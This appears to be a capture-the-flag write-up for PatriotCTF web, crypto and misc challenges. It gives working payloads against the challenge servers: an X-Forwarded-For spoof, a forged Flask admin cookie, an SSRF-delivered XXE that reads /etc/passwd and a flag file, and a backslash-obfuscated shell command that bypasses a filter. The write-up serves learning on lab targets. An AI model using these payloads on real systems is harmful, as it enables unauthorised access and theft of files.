--------------

### CTF: PATRIOTCTF

--------------

![image](https://github.com/user-attachments/assets/ba12119a-dda7-4411-9c7e-f30e71a1bae6)

--------------

- WEB
  - Giraffe-notes
  - Impersonate
  - DOMDOM
- Crypto
  - Bigger is Better
- Misc
  - Really only Echo

----------------

### WEB

-----------------

### Giraffe-notes

![image](https://github.com/user-attachments/assets/5c8b0a94-9240-4e01-8ba9-bc00be6f27cb)

- The web app allows only ip `localhost` and `127.0.0.1`

      $allowed_ip = ['localhost', '127.0.0.1'];

- The web sets variable `allowed` to `True` only if the header `X-FORWARDED-FOR` is set to one of the allowed ips.We can only read the flag if variable `allowed` is set to `True`.
  
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $allowed_ip)) {
          $allowed = true;
      } else {
          $allowed = false;
      }

### Exploitation

- I set header `X-FORWARDED-FOR` to `127.0.0.1` with curl and grepped for `CACI`.

![image](https://github.com/user-attachments/assets/2252e997-f009-48e5-84f1-189d18c1dfcb)

- Flag-:```CACI{1_lik3_g1raff3s_4_l0t}```


-----------------

### Impersonate

![image](https://github.com/user-attachments/assets/01003049-3c72-408b-ad2d-e7620ef2bb49)

### Source Code review

- The app is a flask web app which is a python web framework.The app uses the `datetime.datetime.now()` to grab the current date which is when the server got booted.Then,it converts the date into string using function `strftime()` and format `%Y%m%d%H%M%S`.Lastly, it hashes it with string `secret_key_` and store the result as the flask app session key.

      server_start_time = datetime.now()
      server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
      secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
      app.secret_key = secure_key

- An important route required for exploitation is route `/admin` which grabs the session and check `is_admin` is set to `True` and `username` is set to `administrator`. If these conditions are
fulfilled,we get flag and if it appears otherwise.We get a 401 error.

      if session.get('is_admin') and uuid.uuid5(secret, 'administrator') and session.get('username') == 'administrator':
              return flag
          else:
              abort(401)
- Lastly, the `status` route presents the uptime and current_time.The current time is the present time, while the `uptime` is the `currenttime` - `server_start_time` which is then formatted.There is a certain twist not specified in the code, the server gets rebooted every 5 mins.

          current_time = datetime.now()
          uptime = current_time - server_start_time
          formatted_uptime = str(uptime).split('.')[0]

-------------------

### Exploitation

- I visited the status page to get the `year|month|date|hour` since the hour remains static but subject to change as time moves.Then,I created a wordlist generator that adds the minutes and seconds.We need only 4 figures which will between be range `0000-9999`.Based on the status below,the static part of the `secret_key` will be `secret_key_2024092200`.

 ![image](https://github.com/user-attachments/assets/6d0b86ff-658a-4e62-bf4a-d180a3078ef5)

- Creating a wordlist with my [wordlist script](https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/ctf/patriotctf/script/Impersonate/wordlist.py)

![image](https://github.com/user-attachments/assets/e0b1b189-9456-4c9c-817a-3c98d0401779)

- I wrote another [script](https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/ctf/patriotctf/script/Impersonate/exploit.py) to generate the cookie.The script requires binary `flask-unsign` to bruteforce and sign cookies.

![image](https://github.com/user-attachments/assets/c8249c2f-0355-4d91-8f9f-f73e636567ed)

- Flag with curl
```bash
❯ curl http://chal.competitivecyber.club:9999/admin -H "Cookie: session=eyJpc19hZG1pbiI6dHJ1ZSwidWlkIjoiODMwYjliZTktODUyYy01ZjU3LWIzMDYtNzEyODY3YjJkYTE5IiwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0.Zu9jzw.LxIT56wJkC5TbhcVb2E608vHwIw"
PCTF{Imp3rs0n4t10n_Iz_Sup3r_Ezz}
```
Flag-:```PCTF{Imp3rs0n4t10n_Iz_Sup3r_Ezz}```

--------------------------

### DOMDOM

### TAGS: `Host Header Injection` `SSRF` `XXE`

![image](https://github.com/user-attachments/assets/91000090-e539-4897-82e2-f1810844445c)

-------------------------

### Source Code Review

- The tar file contains this directories and files.

![image](https://github.com/user-attachments/assets/8253dccd-42db-41f4-8324-2068af6d3178)

- The docker file states that the `flag.txt` is stored in `/app/flag.txt`.

![image](https://github.com/user-attachments/assets/40ea2f60-25c9-4d14-8dd0-58bb97de46c6)

- The `app.py` contains the source code for the challenge.I won't be explaining the other routes because they are not vulnerable and not required in explanation of the web app.It should also be noted that the app is a flask app.

----------------------

### Explaining route `check`

- Route `check`

      @app.route('/check', methods=['POST', 'GET'])
      def check():
          r = requests.Session()
          allow_ip = request.headers['Host']
          if request.method == 'POST':
              url = request.form['url']
              url_parsed = urllib.parse.urlparse(url).netloc 
              if allow_ip == url_parsed:
                  get_content = r.get(url = url)
              else:
                  return "Cannot request for that url"
              try:
                  parsed_json = json.loads(get_content.content.decode())["Comment"]
                  parser = etree.XMLParser(no_network=False, resolve_entities=True)
                  get_doc = etree.fromstring(str(parsed_json), parser)
                  print(get_doc, "ho")
                  result = etree.tostring(get_doc)
              except:
                  return "Something wrong!!"
              if result: return result
              else: return "Empty head"
          else:
              return render_template('check.html') 

- The route allows HTTP verbs `GET` and `POST`.The method grabs the `Host` header from the request and stores it in variable `allowed ip`.

      @app.route('/check', methods=['POST', 'GET'])
            def check():
                r = requests.Session()
                allow_ip = request.headers['Host']

- Then, if the request method or `verb` is `POST`.It grabs the query or param `url` from the data and stores it as variable `url`.Then, it passes it to  `urllib.parse.urlparse(url).netloc` to remove the protocol e.g `http://` and slashes `/` as seen in the picture below.The code proceeds further only if `allowed_ip` is equal to variable `url_parsed` which is the value of the urllib parsed url.We can inject an arbitrary host and if the server still makes a request to the normal host, the server is vulnerable to `Host header injection` because servers are not meant to load requests with arbitrary and unknown host headers.

![image](https://github.com/user-attachments/assets/153b208a-0a4c-4875-8bd1-622d5e7a46d4)

    if request.method == 'POST':
            url = request.form['url']
            url_parsed = urllib.parse.urlparse(url).netloc

- If the allowed_ip is equal to url_parsed,the code uses `requests.get()` to load a url which amounts to `Server Side Request Forgery`.SSRF is a web vuln that occurs when a web app loads url.A server can be forced to make requests to internal services or malicious services.In this case,we will be abusing ssrf to serve a payload.

      if allow_ip == url_parsed:
                  get_content = r.get(url = url)

--------------------------

### XML External Entity

- XXE occurs when a XML parsers resolves entities in web applications.External entities references can be abused to read files and other malicious purposes.

- The code snippet below uses `json.loads` to convert the `json` data which has already been decoded to remove bytes and control characters to a `dict`.Then, the key `Comment`'s value is retrieved from the dict.A parser is created with `lxml.etree`'s xml parser which is vulnerable to `XXE` only if the `resolve_entities` keyword is set to boolean `True`.It is parsed and converted into string and returned as a response.

      parsed_json = json.loads(get_content.content.decode())["Comment"]
                parser = etree.XMLParser(no_network=False, resolve_entities=True)
                get_doc = etree.fromstring(str(parsed_json), parser)
                print(get_doc, "ho")
                result = etree.tostring(get_doc)

- There is a slight twist,lxml's xml parser only loads xml code as bytes but the code converts the value of our payload to string which will trigger a `ValueError` and prevent our payload execution.

![image](https://github.com/user-attachments/assets/77b30545-3ac3-4f9f-b8dd-d1f3d8a307a9)

-----------------------

### Bypassing the filters

- I bypassed the host header filter by injecting the urllib parsed version of the malicious url.

![image](https://github.com/user-attachments/assets/bf33bdde-73b3-457b-a108-1ba72a8e4f81)

- I was able to pass string to the xml parser by removing the default xml tags and declaring the entities in a tag.With this process,I read my `/etc/passwd` locally.

![image](https://github.com/user-attachments/assets/bd0c7878-bb4c-4b39-b8a1-887294612fe0)

-------------------

### Exploitation

- My first attempt at exploiting the vulnerability was reading the server's `/etc/passwd` file.I set up a mock netcat listening server to serve an http resposnse containing a json content as seen below.I tunneled to the internet with `ngrok`.

      ❯ cat index.html
      HTTP/1.1 200 OK
      Content-Type: application/json; charset=UTF-8
      Server: netcat!
      
      {"Comment":"<!DOCTYPE foo [<!ENTITY example SYSTEM '/etc/passwd'> ]>\n<p>&example;</p>"}

![image](https://github.com/user-attachments/assets/7f347995-322c-40d7-8090-538d54650c58)

- Now, we can load our malicious url with curl,don't forget to use `ctrl+c` to end our nc connection.The payload worked,I was able to read the `/etc/passwd` file.File read achieved

![image](https://github.com/user-attachments/assets/28d64d48-c0d4-40fd-9ed2-931f98d71926)

- The flagfile is located in `/app/flag.txt`.Flag's payload

      HTTP/1.1 200 OK
      Content-Type: application/json; charset=UTF-8
      Server: netcat!
      
      {"Comment":"<!DOCTYPE foo [<!ENTITY example SYSTEM '/app/flag.txt'> ]><p>&example;</p>"}

![image](https://github.com/user-attachments/assets/3371604f-7d78-475a-8289-fa0b44140f20)

- Flag-:```PCTF{Y0u_D00m3D_U5_Man_So_SAD}```
  
--------------------------

### CRYPTO

--------------------------

### BIGGER IS BETTER

![image](https://github.com/user-attachments/assets/b36c7641-7b2d-49b2-be57-277a70743c71)

-------------------------

- This challenge is based on RSA cryptography and vulnerable to the `wiener` attack which is often used when a small private key (d) is used often leading to a very large public exponent `e`, sometimes as big as the modulus (n).

- The calculation is extreme and complex, there is a python module to attack the numbers.

- Save the file in the script's directory

  - Curl-:```curl -O https://raw.githubusercontent.com/orisano/owiener/master/owiener.py```

- Script

      #! /usr/bin/env python3
      import owiener
      from Crypto.Util.number import *
      
      n = 0xa0d9f425fe1246c25b8c3708b9f6d7747dd5b5e7f79719831c5cbe19fb7bab66ed62719b3fc6090120d2cfe1410583190cd650c32a4151550732b0fc97130e5f02aa26cb829600b6ab452b5b11373ec69d4eaae6c392d92da8bcbea85344af9d4699e36fdca075d33f58049fd0a9f6919f3003512a261a00985dc3d9843a822974df30b81732a91ce706c44bde5ff48491a45a5fa8d5d73bba5022af803ab7bd85250e71fc0254fcf078d21eaa5d38724014a85f679e8a7a1aad6ed22602465f90e6dd8ef95df287628832850af7e3628ad09ff90a6dbdf7a0e6d74f508d2a6235d4eae5a828ac95558bbdf72f39af5641dfe3edb0cdaab362805d926106e2af
      e = 0x5af5dbe4af4005564908a094e0eabb0a921b7482483a753e2a4d560700cb2b2dc9399b608334e05140f54d90fcbef70cec097e3f75395d0c4799d9ec3e670aca41da0892a7b3d038acb7a518be1ced8d5224354ce39e465450c12be653639a8215afb1ba70b1f8f71fc1a0549853998e2337604fca7edac67dd1e7ddeb897308ebf26ade781710e6a2fe4c533a584566ea42068d0452c1b1ecef00a781b6d31fbab893de0c9e46fce69c71cefad3119e8ceebdab25726a96aaf02a7c4a6a38d2f75f413f89064fef14fbd5762599ca8eb3737122374c5e34a7422ea1b3d7c43a110d3209e1c5e23e4eece9e964da2c447c9e5e1c8a6038dc52d699f9324fd6b9
      c = 0x731ceb0ac8f10c8ff82450b61b414c4f7265ccf9f73b8e238cc7265f83c635575a9381aa625044bde7b34ad7cce901fe7512c934b7f6729584d2a77c47e8422c8c0fe2d3dd12aceda8ef904ad5896b971f8b79048e3e2f99f600bf6bac6cad32f922899c00fdc2d21fcf3d0093216bfc5829f02c08ba5e534379cc9118c347763567251c0fe57c92efe0a96c8595bac2c759837211aac914ea3b62aae096ebb8cb384c481b086e660f0c6249c9574289fe91b683609154c066de7a94eafa749c9e92d83a9d473cc88accd9d4c5754ccdbc5aa77ba9a790bc512404a81fc566df42b652a55b9b8ffb189f734d1c007b6cbdb67e14399182016843e27e6d4e5fca
      
      d = owiener.attack(e,n)
      m = pow(c,d,n)
      flag = long_to_bytes(m).decode()
      print(flag)

- Flag
  
![image](https://github.com/user-attachments/assets/7ded5a07-3ec8-49f9-be3e-0e4f271d7489)

- Flag-:```pctf{fun_w1th_l4tt1c3s_f039ab9}```

--------------------

### Misc

--------------------

### Really Only Echo

![image](https://github.com/user-attachments/assets/ed1940ae-6c6c-4879-a5e5-5ba3d12f9929)

-------------------

- The main goal of the challenge is to read `flag.txt` with `echo`.The code lists the binaries within directory `/bin` and blacklists them from usage but removes `echo` from the list.

      blacklist = os.popen("ls /bin").read().split("\n")
      blacklist.remove("echo")
- The code also checks if `echo` is in user input and also filters `>` to prevent redirection.

      if not "echo" in parsed:
              return False
          else:
              if ">" in parsed:
                  #print("HEY! No moving things around.")
                  req.sendall(b"HEY! No moving things around.\n\n")
                  return False
- Lastly,the code prevents the usage of special linux chars like `$()|&;<>\`.

      command.replace("$", " ").replace("(", " ").replace(")", " ").replace("|"," ").replace("&", " ").replace(";"," ").replace("<"," ").replace(">"," ").replace("`"," ").split()
            #print(parsed)

------------------

### Bypassing the filters

- I bypassed the filters with characters `\` and `backticks` that are not being filtered.Linux shells executes binaries even if they are separated by slashes.e.g

![image](https://github.com/user-attachments/assets/18b6f96c-5c6a-4a43-b2a2-e587e9da1a8c)

- I read the flag with payload

      echo `c\a\t flag.txt`

![image](https://github.com/user-attachments/assets/051e363d-f8ac-45ab-9033-4bb378fac673)

- Flag-:```pctf{echo_is_such_a_versatile_command}```

---------------------------------

### THANKS FOR READING!!!!

--------------------------------
